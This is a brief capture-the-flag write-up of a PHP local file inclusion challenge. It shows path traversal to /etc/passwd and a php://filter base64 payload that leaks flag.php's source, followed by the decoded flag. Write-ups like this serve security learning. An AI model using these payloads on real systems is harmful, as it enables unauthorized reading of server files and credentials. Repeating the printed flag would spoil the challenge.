# no-external-interaction

So I tried putting in the page param `../../../../etc/passwd` in and see what I get. It worked.
We had local file inclusion. I also tried `/etc/passwd` and it worked as well.

After doing a dirsearch on the url I found that there is a file named `flag.php`.
I tried opening the file using the page param, but I only got try harder.

The I remember we can use php to display files as base64.
So I did so:
```php
/router.php?page=php://filter/convert.base64-encode/resource=flag.php
```

This gave me a big base64 string: `PD9waHAgCgokZmxhZyA9ICJDVEZ7NjMwNTU1OGNlY2QwMDUzZGZjZGU5ZGFkOGI3YTdlYTFhN2QwMWRiZGYzZTI3MDdhZjA0ODc1Zjg3NDk5OGNhN30iOwoKZWNobyAidHJ5IGhhcmRlciEiOw==`

Decoding it in cyberchef gave me:
```php
<?php 

$flag = "CTF{6305558cecd0053dfcde9dad8b7a7ea1a7d01dbdf3e2707af04875f874998ca7}";

echo "try harder!";
```

flag: `CTF{6305558cecd0053dfcde9dad8b7a7ea1a7d01dbdf3e2707af04875f874998ca7}`